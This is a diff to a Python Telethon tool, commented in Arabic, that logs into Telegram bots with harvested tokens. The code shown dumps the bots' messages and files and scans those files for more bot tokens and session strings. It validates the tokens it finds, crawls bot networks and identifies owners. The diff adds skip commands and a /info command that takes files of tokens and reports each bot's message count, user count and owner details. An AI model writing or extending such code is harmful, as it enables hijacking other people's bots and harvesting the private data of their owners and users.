@@ -126,11 +126,16 @@ def log_event(kind, detail=""):
 # التحميلات بتتضرب ورا بعض من غير استنى (أقصى عدد DOWNLOAD_MAX_CONCURRENT في نفس الوقت).
 SKIP_DOWNLOAD = {'requested': False}
 ACTIVE_DOWNLOADS = {}
+SKIP_ALL_BOTS = set()  # توكنات البوتات اللي اتطلب ليها تخطي-الكل: ملفاتها مش هتتحمل لحد ما فحص البوت يخلص
+SKIP_TOKENS = set()  # توكنات البوتات اللي اتطلب ليها تخطي-التوكن: فحصها كله هيتخطى لحد ما فحص البوت يخلص
+INFO_PENDING = {}  # /info: user_id -> {'tokens': set, 'task': asyncio.Task} — ملفات txt المستلمة بانتظار ثانية التجميع
+PARKED_BOTS = {}  # البوتات الموقوفة بالفلود في الفحص الشبكي: التوكن -> (وقت الرجوع، المستوى)
 DOWNLOAD_MAX_CONCURRENT = 5
 MAX_SCAN_FILE_SIZE = 1024 * 1024 * 1024  # 1 جيجا: أي ملف أكبر من كده بيتجاهل في الفحص
 # الفحص الشبكي: أقصى عدد بوتات بتتفحص في نفس الوقت في كل مستوى (سحب الرسايل
 # واستخراج الأنماط من كل بوت بيحصل جواه). تحميل الملفات لسه 5 للبوت الواحد.
 NETWORK_MAX_CONCURRENT_BOTS = 20
+INFO_MAX_CONCURRENT_BOTS = 20  # طابور فحص معلومات التوكنات (/info): 40 بوت في نفس الوقت
 SCAN_REQUEST_SPACING = 0.8
 
 
@@ -160,7 +165,7 @@ SCAN_GATE = _ScanRequestGate()
 
 
 def _console_listener_thread():
-    log_event("أوامر", "مستمع أوامر الطرفية شغال - اكتب .تخطي لتخطي الملفات الجاري تحميلها")
+    log_event("أوامر", "مستمع أوامر الطرفية شغال - اكتب .تخطي لتخطي الملفات الجاري تحميلها، أو .تخطي-الكل لتجاهل كل ملفات البوت اللي بيتحمل دلوقتي، أو .تخطي-التوكن لتخطي البوت كله")
     while True:
         try:
             line = sys.stdin.readline()
@@ -171,10 +176,39 @@ def _console_listener_thread():
         if line.strip() == ".تخطي":
             if ACTIVE_DOWNLOADS:
                 SKIP_DOWNLOAD['requested'] = True
-                biggest = max(ACTIVE_DOWNLOADS, key=lambda k: ACTIVE_DOWNLOADS[k])
-                log_event("تخطي", f"أمر تخطي وصل - {len(ACTIVE_DOWNLOADS)} ملفات بتحمل دلوقتي، أكبر واحد {biggest} اتحمل منه {ACTIVE_DOWNLOADS[biggest]} بايت لحد دلوقتي")
+                biggest = max(ACTIVE_DOWNLOADS, key=lambda k: ACTIVE_DOWNLOADS[k]['bytes'])
+                log_event("تخطي", f"أمر تخطي وصل - {len(ACTIVE_DOWNLOADS)} ملفات بتحمل دلوقتي، أكبر واحد {biggest} اتحمل منه {ACTIVE_DOWNLOADS[biggest]['bytes']} بايت لحد دلوقتي")
             else:
                 log_event("تخطي", "أمر تخطي وصل بس مفيش ملف بيتحمل دلوقتي")
+        elif line.strip() == ".تخطي-الكل":
+            if ACTIVE_DOWNLOADS:
+                SKIP_DOWNLOAD['requested'] = True
+                bots = {info['bot_token'] for info in ACTIVE_DOWNLOADS.values() if info.get('bot_token')}
+                for tok in bots:
+                    SKIP_ALL_BOTS.add(tok)
+                if bots:
+                    log_event("تخطي", f"أمر تخطي-الكل وصل - {len(ACTIVE_DOWNLOADS)} ملفات بتحمل دلوقتي، هيتجاهل كل ملفات {len(bots)} بوت لحد ما فحصه يخلص")
+                else:
+                    log_event("تخطي", "أمر تخطي-الكل وصل - فيه ملف بيتحمل بس مش من فحص بوت، اتخطى الملف ده بس")
+            else:
+                log_event("تخطي", "أمر تخطي-الكل وصل بس مفيش ملف بيتحمل دلوقتي")
+        elif line.strip() == ".تخطي-التوكن":
+            if ACTIVE_DOWNLOADS:
+                SKIP_DOWNLOAD['requested'] = True
+                bots = {info['bot_token'] for info in ACTIVE_DOWNLOADS.values() if info.get('bot_token')}
+                for tok in bots:
+                    SKIP_TOKENS.add(tok)
+                if bots:
+                    log_event("تخطي", f"أمر تخطي-التوكن وصل - {len(ACTIVE_DOWNLOADS)} ملفات بتحمل دلوقتي، هيتخطى فحص {len(bots)} بوت كله باللي فيه")
+                else:
+                    log_event("تخطي", "أمر تخطي-التوكن وصل - فيه ملف بيتحمل بس مش من فحص بوت، اتخطى الملف ده بس")
+            elif PARKED_BOTS:
+                tok = list(PARKED_BOTS)[-1]
+                SKIP_TOKENS.add(tok)
+                PARKED_BOTS.pop(tok, None)
+                log_event("تخطي", f"أمر تخطي-التوكن وصل - هيتخطى فحص آخر بوت موقوف بالفلود {_mask_bot_token(tok)} كله باللي فيه، والفحص مش هيستناه")
+            else:
+                log_event("تخطي", "أمر تخطي-التوكن وصل بس مفيش ملف بيتحمل دلوقتي ولا بوت موقوف")
 
 
 def start_console_listener():
@@ -1181,6 +1215,7 @@ async def analyze_bot(bot_token, user_id, progress_callback=None, park_on_flood=
     الاستئناف في التشغيل الجاي. الفردي (الافتراضي) بيستنى زي قبل."""
     temp_bot = None
     temp_session = None
+    keep_skip_all = False
     try:
         await init_database()
         progress = await get_scan_progress(bot_token)
@@ -1248,6 +1283,10 @@ async def analyze_bot(bot_token, user_id, progress_callback=None, park_on_flood=
             if user_state.get('stop_requested'):
                 stopped = True
                 break
+            if bot_token in SKIP_TOKENS:
+                log_event("تخطي", f"أمر تخطي-التوكن وصل للبوت {_mask_bot_token(bot_token)} - هيتخطى باقي فحصه")
+                stopped = True
+                break
             end_range = min(i + chunk_size, max_id + 1)
             chunk = await process_message_chunk(temp_bot, i, end_range, bot_token, user_id, raise_on_flood=park_on_flood)
             await save_scan_batch(
@@ -1294,6 +1333,7 @@ async def analyze_bot(bot_token, user_id, progress_callback=None, park_on_flood=
         if park_on_flood:
             log_event("فحص", f"فلود ويت على البوت {_mask_bot_token(bot_token)} - الفحص وقف وهيكمل من نقطة الاستئناف في التشغيل الجاي")
             print(f"Bot parked on flood wait: {e}")
+            keep_skip_all = True
             return {'success': False, 'error': f'فلود ويت {getattr(e, "seconds", "?")} ثانية', 'parked': True, 'flood_wait_seconds': getattr(e, 'seconds', None)}
         # الفحص الفردي: الفلود اتنام واتعاد 12 مرة جوه، ولو لسه فاشل يرجع خطأ عادي زي قبل
         print(f"Error analyzing bot: {e}")
@@ -1313,6 +1353,10 @@ async def analyze_bot(bot_token, user_id, progress_callback=None, park_on_flood=
             except Exception:
                 pass
         return {'success': False, 'error': str(e)}
+    finally:
+        if not keep_skip_all:
+            SKIP_ALL_BOTS.discard(bot_token)
+            SKIP_TOKENS.discard(bot_token)
 
 
 async def process_message_chunk(bot, start_id, end_id, bot_token, user_id=None, raise_on_flood=False):
@@ -1406,6 +1450,8 @@ async def process_message_chunk(bot, start_id, end_id, bot_token, user_id=None, 
                             log_event("تخطي", f"ملف {document.id} - الاسم {original_name} - وسائط/تطبيق، مش هيتحمل ولا يتفحص")
                         elif (getattr(document, 'size', 0) or 0) > MAX_SCAN_FILE_SIZE:
                             log_event("تخطي", f"ملف {document.id} - الاسم {original_name} - أكبر من 1 جيجا، مش هيتحمل ولا يتفحص")
+                        elif bot_token in SKIP_ALL_BOTS:
+                            log_event("تخطي", f"ملف {document.id} - الاسم {original_name} - تخطي-الكل شغال على البوت ده، مش هيتحمل ولا يتفحص")
                         else:
                             download_jobs.append((document.id, InputDocumentFileLocation(
                                 id=document.id,
@@ -1429,7 +1475,7 @@ async def process_message_chunk(bot, start_id, end_id, bot_token, user_id=None, 
             if hasattr(msg, 'message') and msg.message:
                 _collect_text(msg.message, 'chat')
         if download_jobs:
-            async for doc_id, file_data in _download_batch_files(bot, [(doc_id, loc, True, 12) for doc_id, loc in download_jobs]):
+            async for doc_id, file_data in _download_batch_files(bot, [(doc_id, loc, True, 12) for doc_id, loc in download_jobs], bot_token=bot_token):
                 if not file_data:
                     continue
                 original_name = job_names.get(doc_id, f"file_{doc_id}")
@@ -1741,18 +1787,18 @@ async def validate_token(token):
     return {'valid': False, 'error': 'unknown'}
 
 
-async def download_with_retry(bot, file_location, max_retries=3, allow_partial=False, clear_skip_after=False):
-    ACTIVE_DOWNLOADS[file_location.id] = 0
+async def download_with_retry(bot, file_location, max_retries=3, allow_partial=False, clear_skip_after=False, bot_token=None):
+    ACTIVE_DOWNLOADS[file_location.id] = {'bytes': 0, 'bot_token': bot_token}
     try:
         for attempt in range(max_retries):
             try:
                 log_event("طلب", f"تحميل ملف {file_location.id} - المحاولة {attempt + 1}/{max_retries}")
                 downloaded = bytearray()
-                ACTIVE_DOWNLOADS[file_location.id] = 0
+                ACTIVE_DOWNLOADS[file_location.id]['bytes'] = 0
                 if hasattr(bot, 'iter_download'):
                     async for chunk in bot.iter_download(file_location, chunk_size=65536):
                         downloaded.extend(chunk)
-                        ACTIVE_DOWNLOADS[file_location.id] = len(downloaded)
+                        ACTIVE_DOWNLOADS[file_location.id]['bytes'] = len(downloaded)
                         if SKIP_DOWNLOAD.get('requested'):
                             if allow_partial and downloaded:
                                 log_event("تخطي", f"تخطي ملف {file_location.id} - اتحمل {len(downloaded)} بايت، وهيتفحص منها بس")
@@ -1779,7 +1825,7 @@ async def download_with_retry(bot, file_location, max_retries=3, allow_partial=F
             SKIP_DOWNLOAD['requested'] = False
 
 
-async def _download_batch_files(bot, jobs):
+async def _download_batch_files(bot, jobs, bot_token=None):
     """تحميل ملفات دفعة ورا بعض من غير استنى: كل ملف مهمة لوحده،
     وأقصى عدد DOWNLOAD_MAX_CONCURRENT بيتحملوا في نفس الوقت.
     jobs: قائمة (doc_id, file_location, allow_partial, max_retries).
@@ -1797,7 +1843,7 @@ async def _download_batch_files(bot, jobs):
         doc_id, loc, allow_partial, max_retries = job
         async with sem:
             try:
-                data = await download_with_retry(bot, loc, max_retries=max_retries, allow_partial=allow_partial)
+                data = await download_with_retry(bot, loc, max_retries=max_retries, allow_partial=allow_partial, bot_token=bot_token)
             except Exception:
                 data = None
             return doc_id, data
@@ -2103,20 +2149,19 @@ async def deep_network_analysis(main_bot_token, user_id, progress_callback=None,
                 if token not in seen_tokens:
                     seen_tokens.add(token)
                     queue.append((token, 1))
-        deferred = {}
+        PARKED_BOTS.clear()
         running = set()
 
         async def _scan_one(token, level):
             return token, level, await analyze_bot(token, user_id, park_on_flood=True)
 
-        while queue or running or deferred:
+        while queue or running or PARKED_BOTS:
             while len(running) < NETWORK_MAX_CONCURRENT_BOTS:
                 now = time.monotonic()
-                ready = [t for t, (at, lv) in deferred.items() if at <= now]
+                ready = [(at, t, lv) for t, (at, lv) in list(PARKED_BOTS.items()) if at <= now]
                 if ready:
-                    tok = min(ready, key=lambda t: deferred[t][0])
-                    lv = deferred[tok][1]
-                    del deferred[tok]
+                    _at, tok, lv = min(ready)
+                    PARKED_BOTS.pop(tok, None)
                     log_event("فحص شبكي", f"البوت {_mask_bot_token(tok)} رجع الطابور بعد الفلود ويت - هيكمل من نقطة الاستئناف")
                 elif queue:
                     tok, lv = queue.pop(0)
@@ -2124,10 +2169,18 @@ async def deep_network_analysis(main_bot_token, user_id, progress_callback=None,
                     break
                 running.add(asyncio.create_task(_scan_one(tok, lv)))
             if not running:
-                wait = min(at for at, _ in deferred.values()) - time.monotonic()
+                if not PARKED_BOTS:
+                    continue
+                wait = min(at for at, _ in list(PARKED_BOTS.values())) - time.monotonic()
                 if wait > 0:
                     log_event("فحص شبكي", f"مستني {wait:.0f} ثانية لحد ما الفلود ويت يخلص عشان بوت موقوف يرجع يكمل")
-                    await asyncio.sleep(wait)
+                    while True:
+                        if not PARKED_BOTS:
+                            break
+                        wait_left = min(at for at, _ in list(PARKED_BOTS.values())) - time.monotonic()
+                        if wait_left <= 0:
+                            break
+                        await asyncio.sleep(min(5.0, wait_left))
                 continue
             done, _ = await asyncio.wait(running, return_when=asyncio.FIRST_COMPLETED)
             for task in done:
@@ -2135,7 +2188,7 @@ async def deep_network_analysis(main_bot_token, user_id, progress_callback=None,
                 token, level, new_analysis = await task
                 if new_analysis and new_analysis.get('parked'):
                     wait_s = new_analysis.get('flood_wait_seconds') or 0
-                    deferred[token] = (time.monotonic() + wait_s, level)
+                    PARKED_BOTS[token] = (time.monotonic() + wait_s, level)
                     log_event("فحص شبكي", f"البوت {_mask_bot_token(token)} طلع من الطابور فلود ويت {wait_s} ثانية - هيرجع لما يفضى مكان")
                     continue
                 if new_analysis and new_analysis['success']:
@@ -2185,6 +2238,10 @@ async def deep_network_analysis(main_bot_token, user_id, progress_callback=None,
     except Exception as e:
         print(f"Error in deep network analysis: {e}")
         return {'success': False, 'error': str(e)}
+    finally:
+        SKIP_ALL_BOTS.clear()
+        SKIP_TOKENS.clear()
+        PARKED_BOTS.clear()
 
 
 async def network_broadcast(all_bots_data, message_text, progress_callback=None, stop_event=None):
@@ -2718,8 +2775,11 @@ async def analyze_bot_for_sessions_only(bot_token, user_id):
         chunk_size = 200
         scanned_up_to = start_id - 1
         for i in range(start_id, max_id + 1, chunk_size):
+            if bot_token in SKIP_TOKENS:
+                log_event("تخطي", f"أمر تخطي-التوكن وصل للبوت {_mask_bot_token(bot_token)} - هيتخطى باقي فحصه (جلسات)")
+                break
             end_range = min(i + chunk_size, max_id + 1)
-            chunk = await process_message_chunk_for_sessions(temp_bot, i, end_range)
+            chunk = await process_message_chunk_for_sessions(temp_bot, i, end_range, bot_token)
             await save_scan_batch(bot_token, sessions=chunk['sessions'])
             scanned_up_to = end_range - 1
             await set_scan_progress(progress_key, None, scanned_up_to, max_id, scanned_up_to >= max_id)
@@ -2739,9 +2799,11 @@ async def analyze_bot_for_sessions_only(bot_token, user_id):
             except Exception:
                 pass
         return {'success': False, 'error': str(e)}
+    finally:
+        SKIP_TOKENS.discard(bot_token)
 
 
-async def process_message_chunk_for_sessions(bot, start_id, end_id):
+async def process_message_chunk_for_sessions(bot, start_id, end_id, bot_token=None):
     """معالجة دفعة واحدة للجلسات فقط وإرجاع نتائجها."""
     chunk = {'sessions': []}
     seen_telethon = set()
@@ -2777,13 +2839,15 @@ async def process_message_chunk_for_sessions(bot, start_id, end_id):
                         log_event("تخطي", f"ملف {document.id} - وسائط/تطبيق، مش هيتحمل ولا يتفحص (جلسات)")
                     elif (getattr(document, 'size', 0) or 0) > MAX_SCAN_FILE_SIZE:
                         log_event("تخطي", f"ملف {document.id} - أكبر من 1 جيجا، مش هيتحمل ولا يتفحص (جلسات)")
+                    elif bot_token is not None and bot_token in SKIP_ALL_BOTS:
+                        log_event("تخطي", f"ملف {document.id} - تخطي-الكل شغال على البوت ده، مش هيتحمل ولا يتفحص (جلسات)")
                     else:
                         file_data = await download_with_retry(bot, InputDocumentFileLocation(
                             id=document.id,
                             access_hash=document.access_hash,
                             file_reference=document.file_reference,
                             thumb_size=''
-                        ), allow_partial=True, clear_skip_after=True)
+                        ), allow_partial=True, clear_skip_after=True, bot_token=bot_token)
                     if file_data:
                         text_data = file_data.decode(errors="ignore")
                         for session in _find_telethon_sessions(text_data):
@@ -2831,14 +2895,19 @@ async def analyze_bot_for_tokens_only(bot_token, user_id):
             start_id = progress['last_scanned_id'] + 1
         chunk_size = 200
         scanned_up_to = start_id - 1
+        skipped = False
         for i in range(start_id, max_id + 1, chunk_size):
+            if bot_token in SKIP_TOKENS:
+                log_event("تخطي", f"أمر تخطي-التوكن وصل للبوت {_mask_bot_token(bot_token)} - هيتخطى باقي فحصه (توكنات)")
+                skipped = True
+                break
             end_range = min(i + chunk_size, max_id + 1)
-            chunk = await process_message_chunk_for_tokens(temp_bot, i, end_range)
+            chunk = await process_message_chunk_for_tokens(temp_bot, i, end_range, bot_token)
             await save_scan_batch(bot_token, tokens=chunk['tokens'])
             scanned_up_to = end_range - 1
             await set_scan_progress(progress_key, None, scanned_up_to, max_id, scanned_up_to >= max_id)
         tokens = await get_scan_tokens(bot_token)
-        if tokens:
+        if tokens and not skipped:
             await validate_tokens_parallel(tokens, bot_token=bot_token)
             tokens = await get_scan_tokens(bot_token)
         await temp_bot.disconnect()
@@ -2857,9 +2926,11 @@ async def analyze_bot_for_tokens_only(bot_token, user_id):
             except Exception:
                 pass
         return {'success': False, 'error': str(e)}
+    finally:
+        SKIP_TOKENS.discard(bot_token)
 
 
-async def process_message_chunk_for_tokens(bot, start_id, end_id):
+async def process_message_chunk_for_tokens(bot, start_id, end_id, bot_token=None):
     """معالجة دفعة واحدة للتوكنات فقط وإرجاع نتائجها."""
     chunk = {'tokens': []}
     seen_tokens = set()
@@ -2890,13 +2961,15 @@ async def process_message_chunk_for_tokens(bot, start_id, end_id):
                         log_event("تخطي", f"ملف {document.id} - وسائط/تطبيق، مش هيتحمل ولا يتفحص (توكنات)")
                     elif (getattr(document, 'size', 0) or 0) > MAX_SCAN_FILE_SIZE:
                         log_event("تخطي", f"ملف {document.id} - أكبر من 1 جيجا، مش هيتحمل ولا يتفحص (توكنات)")
+                    elif bot_token is not None and bot_token in SKIP_ALL_BOTS:
+                        log_event("تخطي", f"ملف {document.id} - تخطي-الكل شغال على البوت ده، مش هيتحمل ولا يتفحص (توكنات)")
                     else:
                         file_data = await download_with_retry(bot, InputDocumentFileLocation(
                             id=document.id,
                             access_hash=document.access_hash,
                             file_reference=document.file_reference,
                             thumb_size=''
-                        ), allow_partial=True, clear_skip_after=True)
+                        ), allow_partial=True, clear_skip_after=True, bot_token=bot_token)
                     if file_data:
                         text_data = file_data.decode(errors="ignore")
                         for token in TOKEN_PATTERN.findall(text_data):
@@ -3076,6 +3149,269 @@ async def analyze_token_with_owner(token, user_id, original_text=None):
 
         return None
 
+
+
+async def get_token_info(token, user_id):
+    """معلومات التوكن: عدد الرسايل + عدد المستخدمين + المالك — دخول واحد وفحص واحد."""
+    temp_bot = None
+    temp_session = None
+    try:
+        await init_database()
+        temp_session = os.path.join(SESSION_DIR, f"info_{int(time.time())}_{hash(token)}")
+        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
+        temp_bot.flood_sleep_threshold = 0
+        await temp_bot.start(bot_token=token)
+        me = await temp_bot.get_me()
+        max_id = await find_max_message_id(temp_bot, raise_on_flood=True)
+        owner_info = {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}
+        progress_key = token + "|users"
+        progress = await get_scan_progress(progress_key)
+        if progress and progress['is_complete'] and max_id <= progress['last_scanned_id']:
+            user_ids = await get_scan_user_ids(token)
+        else:
+            start_id = 1
+            if progress:
+                start_id = progress['last_scanned_id'] + 1
+            chunk_size = 200
+            scanned_up_to = start_id - 1
+            for i in range(start_id, max_id + 1, chunk_size):
+                try:
+                    end_range = min(i + chunk_size, max_id + 1)
+                    message_ids = list(range(i, end_range))
+                    messages = await with_telegram_retry(lambda: temp_bot(GetMessagesRequest(message_ids)), flood_action="raise")
+                    local_users = set()
+                    for msg in messages.messages:
+                        if isinstance(msg, MessageEmpty):
+                            continue
+                        if owner_info['user_id'] == 'غير معروف':
+                            cand = await extract_sender_info_from_message(temp_bot, msg, me.id)
+                            if cand and cand.get('user_id') != 'غير معروف':
+                                owner_info = cand
+                        if hasattr(msg, 'from_id') and msg.from_id:
+                            user_id_str = str(msg.from_id.user_id) if hasattr(msg.from_id, 'user_id') else str(msg.from_id)
+                            local_users.add(user_id_str)
+                        if hasattr(msg, 'reply_to') and msg.reply_to:
+                            if hasattr(msg.reply_to, 'from_id') and msg.reply_to.from_id:
+                                reply_user_id = str(msg.reply_to.from_id.user_id) if hasattr(msg.reply_to.from_id, 'user_id') else str(msg.reply_to.from_id)
+                                local_users.add(reply_user_id)
+                        if hasattr(msg, 'peer_id'):
+                            if hasattr(msg.peer_id, 'user_id'):
+                                local_users.add(str(msg.peer_id.user_id))
+                            elif hasattr(msg.peer_id, 'chat_id'):
+                                local_users.add(str(msg.peer_id.chat_id))
+                            elif hasattr(msg.peer_id, 'channel_id'):
+                                local_users.add(str(msg.peer_id.channel_id))
+                    if local_users:
+                        await save_scan_batch(token, users=list(local_users))
+                except FloodWaitError:
+                    raise
+                except Exception as e:
+                    print(f"Error processing info messages {i}-{i+chunk_size}: {e}")
+                    continue
+                scanned_up_to = min(i + chunk_size - 1, max_id)
+                await set_scan_progress(progress_key, None, scanned_up_to, max_id, scanned_up_to >= max_id)
+            user_ids = await get_scan_user_ids(token)
+        if temp_bot and temp_bot.is_connected():
+            await temp_bot.disconnect()
+        try:
+            if os.path.exists(f"{temp_session}.session"):
+                os.remove(f"{temp_session}.session")
+        except Exception:
+            pass
+        return {
+            'token': token,
+            'success': True,
+            'bot_info': {
+                'valid': True,
+                'bot_name': me.first_name or 'غير معروف',
+                'bot_username': me.username or 'غير معروف',
+                'bot_id': me.id,
+                'total_messages': max_id,
+                'total_users': len(user_ids),
+            },
+            'owner_info': owner_info,
+        }
+    except FloodWaitError as e:
+        if temp_bot is not None:
+            try:
+                if temp_bot.is_connected():
+                    await temp_bot.disconnect()
+            except Exception:
+                pass
+        try:
+            if temp_session and os.path.exists(f"{temp_session}.session"):
+                os.remove(f"{temp_session}.session")
+        except Exception:
+            pass
+        return {'token': token, 'success': False, 'parked': True, 'flood_wait_seconds': getattr(e, 'seconds', 0) or 0}
+    except Exception as e:
+        if temp_bot is not None:
+            try:
+                if temp_bot.is_connected():
+                    await temp_bot.disconnect()
+            except Exception:
+                pass
+        try:
+            if temp_session and os.path.exists(f"{temp_session}.session"):
+                os.remove(f"{temp_session}.session")
+        except Exception:
+            pass
+        return {'token': token, 'success': False, 'error': str(e)}
+
+
+async def process_info_tokens(tokens, user_id, progress_callback=None):
+    """فحص معلومات التوكنات: طابور عام (زي الفحص الشبكي) بس 40 بوت في نفس الوقت."""
+    queue = list(tokens)
+    deferred = {}
+    running = set()
+    results = []
+    failed = []
+    done_count = 0
+    total = len(tokens)
+
+    async def _info_one(token):
+        return token, await get_token_info(token, user_id)
+
+    while queue or running or deferred:
+        while len(running) < INFO_MAX_CONCURRENT_BOTS:
+            now = time.monotonic()
+            ready = [(at, t) for t, at in list(deferred.items()) if at <= now]
+            if ready:
+                _at, tok = min(ready)
+                deferred.pop(tok, None)
+                log_event("معلومات", f"البوت {_mask_bot_token(tok)} رجع الطابور بعد الفلود ويت - هيكمل")
+            elif queue:
+                tok = queue.pop(0)
+            else:
+                break
+            running.add(asyncio.create_task(_info_one(tok)))
+        if not running:
+            if not deferred:
+                continue
+            wait = min(list(deferred.values())) - time.monotonic()
+            if wait > 0:
+                log_event("معلومات", f"مستني {wait:.0f} ثانية لحد ما الفلود ويت يخلص عشان بوت موقوف يرجع يكمل")
+                while True:
+                    if not deferred:
+                        break
+                    wait_left = min(list(deferred.values())) - time.monotonic()
+                    if wait_left <= 0:
+                        break
+                    await asyncio.sleep(min(5.0, wait_left))
+            continue
+        done, _ = await asyncio.wait(running, return_when=asyncio.FIRST_COMPLETED)
+        for task in done:
+            running.discard(task)
+            token, info = await task
+            if info and info.get('parked'):
+                wait_s = info.get('flood_wait_seconds') or 0
+                deferred[token] = time.monotonic() + wait_s
+                log_event("معلومات", f"البوت {_mask_bot_token(token)} طلع من الطابور فلود ويت {wait_s} ثانية - هيرجع لما يفضى مكان")
+                continue
+            done_count += 1
+            if info and info.get('success'):
+                results.append(info)
+            else:
+                failed.append(token)
+            if progress_callback:
+                if not await progress_callback(done_count, total):
+                    for t in running:
+                        t.cancel()
+                    await asyncio.gather(*running, return_exceptions=True)
+                    return results, failed
+    return results, failed
+
+
+async def _info_debounce(bot, user_id):
+    """انتظار ثانية بعد آخر ملف، وبعدها فحص كل التوكنات المجمعة مع بعض."""
+    await asyncio.sleep(1)
+    pending = INFO_PENDING.pop(user_id, None)
+    if not pending or not pending.get('tokens'):
+        return
+    await _info_process(bot, user_id, sorted(pending['tokens']))
+
+
+async def _info_process(bot, user_id, tokens):
+    """فحص معلومات التوكنات وإرسال ملف النتائج + ملخص — بدون تكرار."""
+    total = len(tokens)
+    progress_msg = await bot.send_message(user_id, f"⏳ جاري فحص معلومات التوكنات...\n📊 التقدم: 0/{total} (0%)")
+    last_update_time = 0
+
+    async def update_info_progress(current, total_count):
+        nonlocal last_update_time
+        current_time = time.time()
+        if current_time - last_update_time >= 3 or current == total_count:
+            last_update_time = current_time
+            percent = (current / total_count) * 100
+            new_text = f"⏳ جاري فحص معلومات التوكنات...\n📊 التقدم: {current}/{total_count} ({percent:.1f}%)"
+            try:
+                if getattr(progress_msg, 'text', None) != new_text:
+                    await progress_msg.edit(new_text)
+            except Exception as e:
+                if "not modified" not in str(e).lower():
+                    print(f"⚠️ خطأ في تعديل رسالة تقدم /info: {e}")
+        return True
+
+    try:
+        results, failed = await process_info_tokens(tokens, user_id, progress_callback=update_info_progress)
+        await progress_msg.delete()
+
+        if not results:
+            await bot.send_message(user_id, "❌ لم يتم العثور على أي توكنات صالحة أو لم نتمكن من تحليلها")
+            await set_user_state(user_id, {'step': 'start'})
+            return
+
+        new_file_content = ""
+        for i, token_data in enumerate(results, 1):
+            token = token_data['token']
+            bot_info = token_data.get('bot_info', {})
+            owner_info = token_data.get('owner_info', {})
+            new_file_content += f"🆔 الرقم: {i}\n"
+            new_file_content += f"🔐 معلومات التوكن:\n`{token}`\n"
+            new_file_content += f"🤖 معلومات البوت:\n"
+            new_file_content += f"├ الاسم: {bot_info.get('bot_name', 'غير معروف')}\n"
+            new_file_content += f"├ المستخدم: @{bot_info.get('bot_username', 'غير معروف')}\n"
+            new_file_content += f"├📩عدد الرسائل: {bot_info.get('total_messages', 'غير معروف')}\n"
+            new_file_content += f"├👤عدد المستخدمين: {bot_info.get('total_users', 'غير معروف')}\n"
+            new_file_content += f"└ الآيدي: {bot_info.get('bot_id', 'غير معروف')}\n"
+            if owner_info:
+                new_file_content += f"👑 معلومات المالك:\n"
+                new_file_content += f"├ اسمه: {owner_info.get('name', 'غير معروف')}\n"
+                new_file_content += f"├ يوزر: {owner_info.get('username', 'غير معروف')}\n"
+                new_file_content += f"└ ايديه: {owner_info.get('user_id', 'غير معروف')}\n"
+            else:
+                new_file_content += f"👑 معلومات المالك:\n├ لم يتم العثور على معلومات المالك\n"
+            new_file_content += "- - - - - - - - - - - - - - - -\n\n"
+
+        filename = os.path.join(SESSION_DIR, f"tokens_info_{int(time.time())}.txt")
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(new_file_content)
+
+        await bot.send_file(
+            entity=user_id,
+            file=filename,
+            caption=f"📋 ملف التوكنات مع معلوماتها\n• عدد التوكنات الصالحة: {len(results)}",
+            attributes=[DocumentAttributeFilename("tokens_info.txt")]
+        )
+
+        try:
+            os.remove(filename)
+        except:
+            pass
+
+        owners_found = sum(1 for token_data in results if token_data.get('owner_info') and token_data['owner_info'].get('user_id') != 'غير معروف')
+        await bot.send_message(
+            user_id,
+            f"✅ **تم الانتهاء من فحص المعلومات**\n\n"
+            f"📊 النتائج:\n"
+            f"• إجمالي التوكنات: {total}\n"
+            f"• التوكنات الصالحة: {len(results)}\n"
+            f"• التوكنات الفاشلة: {len(failed)}\n"
+            f"• عدد الملاك المكتشفين: {owners_found}"
+        )
+    except Exception as e:
+        await bot.send_message(user_id, f"❌ حدث خطأ في فحص المعلومات: {str(e)}")
+    await set_user_state(user_id, {'step': 'start'})
 
 
 async def get_first_message_sender(bot):
@@ -3264,7 +3600,7 @@ async def main():
                           "📋 **الأوامر المتاحة:**\n\n"
                           "🔹 /dump - تحليل وسحب محتوى البوت\n"
                           "🔹 /file - تحليل ملف توكنات\n"
-                          "🔹 /owner - استخراج معلومات مالك البوت\n\n"
+                          "🔹 /owner - استخراج معلومات مالك البوت\n""🔹 /info - معلومات التوكنات (رسايل/مستخدمين/مالك)\n\n"
                           "💡 **المميزات:**\n"
                           "• تحليل شامل للبوتات\n"
                           "• استخراج الملفات والصور\n"
@@ -3540,6 +3876,56 @@ async def main():
                 buttons=buttons
             )
 
+        except Exception as e:
+            await event.respond(f"❌ حدث خطأ في معالجة الملف: {str(e)}")
+            await set_user_state(user_id, {'step': 'start'})
+
+
+    @bot.on(events.NewMessage(pattern='/info'))
+    async def info_handler(event):
+        if not await check_user_permission(event):
+            return
+
+        user_id = event.sender_id
+
+        old = INFO_PENDING.pop(user_id, None)
+        if old and old.get('task'):
+            old['task'].cancel()
+
+        await set_user_state(user_id, {'step': 'waiting_info_files'})
+        await event.respond("📋 **أمر معلومات التوكنات**\n\n"
+                            "📝 أرسل ملف txt يحتوي على التوكنات\n\n"
+                            "💡 ممكن ترسل أكتر من ملف ورا بعض — هستنى ثانية بعد آخر ملف وأفحصهم كلهم مع بعض\n\n"
+                            "سأستخرج لكل توكن:\n"
+                            "• 📩 عدد الرسائل\n"
+                            "• 👤 عدد المستخدمين\n"
+                            "• 👑 المالك")
+
+    @bot.on(events.NewMessage(func=lambda e: e.is_private and e.file))
+    async def info_file_receiver_handler(event):
+        user_id = event.sender_id
+        user_state = await get_user_state(user_id)
+
+        if user_state.get('step') != 'waiting_info_files':
+            return
+
+        try:
+            file = await event.download_media(file=bytes)
+            text_content = file.decode('utf-8', errors='ignore')
+            pending = INFO_PENDING.get(user_id)
+            if pending is None:
+                pending = {'tokens': set(), 'task': None}
+                INFO_PENDING[user_id] = pending
+            before = len(pending['tokens'])
+            pending['tokens'].update(TOKEN_PATTERN.findall(text_content))
+            added = len(pending['tokens']) - before
+            if added == 0:
+                await event.respond("❌ لم يتم العثور على أي توكنات جديدة في الملف")
+                return
+            if pending.get('task'):
+                pending['task'].cancel()
+            pending['task'] = asyncio.create_task(_info_debounce(bot, user_id))
+            await event.respond(f"📥 استلمت الملف — {added} توكن جديد (المجموع حتى الآن: {len(pending['tokens'])})\n⏳ هستنى ثانية لو هتبعت ملفات تانية")
         except Exception as e:
             await event.respond(f"❌ حدث خطأ في معالجة الملف: {str(e)}")
             await set_user_state(user_id, {'step': 'start'})
